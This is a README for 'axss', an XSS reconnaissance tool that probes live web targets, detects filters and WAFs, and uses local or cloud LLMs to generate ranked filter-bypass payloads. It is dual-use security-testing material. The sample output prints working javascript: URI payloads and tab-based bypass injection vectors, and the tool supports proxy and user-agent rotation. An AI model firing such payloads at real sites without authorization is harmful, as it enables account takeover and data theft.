# axss

![Python](https://img.shields.io/badge/python-3.10%2B-3776AB?logo=python&logoColor=white)
![CLI](https://img.shields.io/badge/interface-CLI-111111)
![Ollama](https://img.shields.io/badge/Ollama-local%20runtime-111111?logo=ollama&logoColor=white)
![Qwen3.5](https://img.shields.io/badge/Qwen3.5-4B%20%7C%209B%20%7C%2027B%20%7C%2035B-0F766E)

`axss` is a context-aware XSS recon CLI that actively probes live targets, maps filter behavior, detects DOM sinks and framework fingerprints, and generates ranked, ready-to-fire payloads — including filter bypass variants tailored to what the probe observed. It runs entirely local-first with a self-learning findings store that gets smarter over time.

## How it works

```
fetch target HTML
    ↓
passive analysis
  • DOM sink detection (innerHTML, eval, location.href, jQuery, dangerouslySetInnerHTML, …)
  • Framework fingerprinting (React, Vue, Angular, AngularJS)
  • HTML attribute reflection (href, on*, srcdoc, style)
  • Encoding chain detection (base64, base32, URL, gzip+base64, rot13, …)
    ↓
active probing  (default on live URLs, disable with --no-probe)
  phase 1: canary per parameter → finds reflection points and classifies context
           (js_string_dq/sq/bt, html_attr_url/value/event, html_body, html_comment, json_value)
  phase 2: char survival probe → confirms which XSS-critical chars survive the filter
    ↓
payload generation  (escalation chain)
  1. local Ollama (findings-enriched prompt — probe results + past bypass examples upfront)
  2. if local output is weak AND a cloud key is set → OpenRouter or OpenAI
     cloud payloads are saved to the findings store for future local runs
  3. heuristic engine always runs in parallel (context-aware, no LLM needed)
    ↓
ranking + threshold filter
  scored by sink match, probe confirmation, bypass family relevance, surviving chars
  default threshold: 60 — always shows at least 5 payloads
```

## Self-learning findings store

Every time a cloud model generates payloads, `axss` saves them to `~/.axss/findings.jsonl` keyed by sink type, reflection context, and surviving characters. On the next scan of a similar target, those findings are injected as few-shot examples into the local model prompt — so the local model reasons from real bypass patterns discovered by the stronger cloud model, without ever needing to call the cloud again.

The store grows silently in the background, capped at 500 entries (oldest roll off). Nothing is sent anywhere; it stays entirely local.

## Active probing

When scanning a live URL with query parameters, `axss` runs two probe requests per parameter by default:

1. **Canary request** — injects a unique token to find every reflection point and classify the HTML/JS context at each one.
2. **Char survival request** — wraps XSS-critical characters (`< > " ' ( ) ; / \ ` { }`) in sentinel markers to confirm which ones survive the server's filter.

Probe results flow directly into payload generation: the LLM prompt leads with surviving chars and confirmed sink context; the heuristic engine generates bypass payloads tailored to what was observed (e.g. `java%09script:` tab bypass when `(` and `)` survive but `javascript:` is filtered in an href sink).

Live probe output streams as results arrive. Use `--no-live` to suppress streaming, `--no-probe` to skip probing entirely.

## Model escalation chain

```
Local Ollama  (qwen3.5:9b default, findings-enriched prompt)
    ↓  if output is weak (< 3 payloads or all generic)
OpenRouter    (preferred cloud — set OPENROUTER_API_KEY)
    ↓  if OpenRouter unavailable or fails
OpenAI        (gpt-4o-mini — set OPENAI_API_KEY)
    ↓  if no API keys / both fail
Heuristic-only  (always works, no network needed)
```

Cloud escalation only triggers when the local model's output fails a quality check. Use `--no-cloud` to guarantee offline-only operation even if a key is set, or set `use_cloud: false` in `~/.axss/config.json` to make that permanent.

## Payload generation

`axss` combines three sources and ranks the union:

- **Heuristic engine** — context-aware, deterministic. Generates payloads for every detected sink: encoded param delivery (base64/UU/etc.), href whitespace bypasses (`%09`/`%0a`/`%0d` in scheme), event handler injection, DOM source payloads, jQuery HTML sinks, probe-confirmed contexts, and more.
- **LLM generation** — local Ollama (or cloud fallback) receives the full parsed context, probe results, and relevant past findings, then generates additional targeted payloads.
- **Public payload database** — `--public` fetches community XSS payloads and injects a diverse sample as reference examples into the LLM prompt.

## Setup

### Fast path

```bash
./setup.sh
axss --help
```

`setup.sh` installs Ollama (if missing), detects your RAM/VRAM, pulls the right Qwen3.5 tier, writes `~/.axss/config.json`, builds the venv, and symlinks `axss` to `~/.local/bin/axss`.

### Manual setup

```bash
# 1. Install Ollama
curl -fsSL https://ollama.com/install.sh | sh
ollama serve

# 2. Pull a model
ollama pull qwen3.5:9b   # balanced default
ollama pull qwen3.5:4b   # low memory
ollama pull qwen3.5:27b  # higher quality (32 GB+ RAM)
ollama pull qwen3.5:35b  # GPU tier (24 GB+ VRAM)

# 3. Configure
mkdir -p ~/.axss
cat > ~/.axss/config.json <<'EOF'
{
  "default_model": "qwen3.5:9b",
  "use_cloud": true,
  "cloud_model": "anthropic/claude-3-5-sonnet"
}
EOF

# 4. Install
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### Model sizing

| Tier | Model | Recommended hardware |
|------|-------|----------------------|
| Low | `qwen3.5:4b` | < 8 GB RAM |
| Standard | `qwen3.5:9b` | 8–32 GB RAM |
| High | `qwen3.5:27b` | 32 GB+ RAM |
| GPU | `qwen3.5:35b` | 24 GB+ NVIDIA VRAM |

### Cloud configuration (optional)

```bash
export OPENROUTER_API_KEY="sk-or-..."   # preferred
export OPENAI_API_KEY="sk-..."          # fallback

# Set preferred OpenRouter model in ~/.axss/config.json:
# "cloud_model": "google/gemini-2.0-flash-001"
```

## Usage

### Common examples

```bash
# Scan a live target with active probing (default)
axss -u "https://example.com/search?q=test"

# Verbose output — see probe results, findings store hits, escalation decisions
axss -u "https://example.com/search?q=test" -v --threshold 50

# Skip active probing (passive analysis only)
axss -u "https://example.com" --no-probe

# Suppress live probe stream, show final output only
axss -u "https://example.com?q=test" --no-live

# Force offline — never escalate to cloud even if keys are set
axss -u "https://example.com?q=test" --no-cloud

# Public payload reference + WAF context
axss -u "https://example.com?q=test" --public --waf cloudflare -o heat

# Parse local HTML
axss -i sample_target.html -o list -t 10

# Parse an inline HTML snippet
axss -i '<script>eval(location.hash.slice(1))</script>'

# Batch scan with rate limiting
axss --urls urls.txt -r 5 -o list

# Merge batch URLs into one payload set
axss --urls urls.txt --merge-batch -o json -j result.json

# Write JSON to disk
axss -u "https://example.com?q=test" -o json -j result.json

# Dump public payloads for a WAF (no target needed)
axss --public --waf modsecurity -o list

# List local Ollama models
axss -l

# Search available models
axss -s qwen3.5
```

### All flags

| Flag | Default | Description |
|------|---------|-------------|
| `-u, --url TARGET` | — | Fetch and scan a live URL |
| `--urls FILE` | — | Scan one URL per line from a file |
| `-i, --input FILE_OR_SNIPPET` | — | Parse a local file or raw HTML string |
| `--public` | off | Fetch community XSS payloads and inject as reference |
| `--waf NAME` | auto | Set WAF context (auto-detected from response headers) |
| `-m, --model MODEL` | config | Override the local Ollama model |
| `-o, --output` | `list` | Output format: `list`, `heat`, `json`, `interactive` |
| `-t, --top N` | 20 | Max payloads to display |
| `-j, --json-out PATH` | — | Always write full JSON result to this path |
| `-r, --rate N` | 25 | Max requests/sec against target (0 = uncapped) |
| `--threshold N` | 60 | Min risk score for output (always shows ≥ 5) |
| `--no-probe` | off | Skip active parameter probing |
| `--no-live` | off | Suppress streaming probe output |
| `--no-cloud` | off | Never escalate to cloud LLM |
| `-v, --verbose` | off | Show detailed sub-step progress |
| `--merge-batch` | off | Combine batch contexts into one payload set |
| `-l, --list-models` | — | List local Ollama models |
| `-s, --search-models QUERY` | — | Search Ollama model library |
| `-V, --version` | — | Show version |

### Supported WAFs

`cloudflare`, `akamai`, `imperva`, `aws`, `f5`, `modsecurity`, `fastly`, `sucuri`, `barracuda`, `wordfence`, `azure`

## Output modes

- **`list`** — ranked table with payload, inject vector, tags, and risk score.
- **`heat`** — compact risk heat view, good for quick triage.
- **`json`** — full structured output for automation and post-processing.
- **`interactive`** — browse payloads in a scrollable TUI.

## Sample output

```text
$ axss -u "https://target.example/page?url=test" -v --threshold 70

[~] Rate limit: 25 req/sec
[*] Probing for WAF on https://target.example/page?url=test...
[~] No WAF fingerprint detected — use --waf to set manually.
[*] Fetching/parsing target: https://target.example/page?url=test
[*] Active probing: 1 parameter(s) × 2 requests each...
[+] [probe] 'url' → html_attr_url(href) | chars='()/;`{}' | INJECTABLE

 1. [96] JavaScript URI injection [url]
    payload: javascript:alert(document.domain)
    inject:  ?url=javascript%3Aalert%28document.domain%29
    tags:    probe-confirmed, html_attr_url, param:url

[+] Probing complete: 1/1 parameter(s) injectable, 1 reflected.
[*] Generating payloads with qwen3.5:9b...
[~]   Findings store: no prior findings for this context.
[~]   Generating payloads...
[~]   Local model output weak — attempting cloud escalation...
[~]   No cloud API keys configured — running heuristic-only.
[+] Done. 6 payloads above threshold 70 (32 below, 38 total).

 1. [95] href javascript: bypass — leading tab (\x09)
    payload: [TAB]javascript:alert(document.domain)
    inject:  ?url=%09javascript%3Aalert%28document.domain%29
    tags:    href, javascript-url, whitespace-bypass, filter-bypass

 2. [87] href javascript: bypass — tab (\x09) in scheme
    payload: java[TAB]script:alert(document.domain)
    inject:  ?url=java%09script%3Aalert%28document.domain%29
    tags:    href, javascript-url, whitespace-bypass, filter-bypass
```

## Environment variables

| Variable | Purpose |
|----------|---------|
| `OPENROUTER_API_KEY` | Enables OpenRouter cloud escalation |
| `OPENAI_API_KEY` | Enables OpenAI cloud escalation (fallback) |
| `OLLAMA_HOST` | Override Ollama base URL (default: `http://127.0.0.1:11434`) |
| `AXSS_USER_AGENTS` | File path or comma-separated User-Agent strings to rotate |
| `AXSS_PROXIES` | File path or comma-separated proxy list |

## Config file (`~/.axss/config.json`)

```json
{
  "default_model": "qwen3.5:9b",
  "use_cloud": true,
  "cloud_model": "anthropic/claude-3-5-sonnet"
}
```

| Key | Default | Description |
|-----|---------|-------------|
| `default_model` | `qwen3.5:9b` | Local Ollama model |
| `use_cloud` | `true` | Allow cloud escalation when local output is weak |
| `cloud_model` | `anthropic/claude-3-5-sonnet` | Preferred OpenRouter model |

## Findings store (`~/.axss/findings.jsonl`)

Each line is a JSON object capturing:

- `sink_type` — e.g. `reflected_in_href`, `js_string_via_base64`
- `context_type` — e.g. `html_attr_url`, `js_string_dq`
- `surviving_chars` — chars confirmed to survive the filter
- `bypass_family` — one of 16 named families (whitespace-in-scheme, js-string-breakout, constructor-chain, …)
- `payload` / `test_vector` — the exact payload and delivery vector
- `model` — which model generated it
- `verified` — manually confirmed to execute in browser

Future local runs retrieve findings by scoring sink type match (+4), context type match (+3), surviving char overlap (+1–3), and verified status (+2), then inject the top matches as few-shot examples into the prompt.

## Notes

- The heuristic engine runs regardless of LLM availability — `axss` is always useful offline.
- Live crawling uses Scrapling with stealth headers.
- `axss -l` wraps `ollama list`; `axss -s <query>` prefers `ollama search` and falls back to Ollama web search.
- The default model comes from `~/.axss/config.json`; falls back to `qwen3.5:9b` if missing.
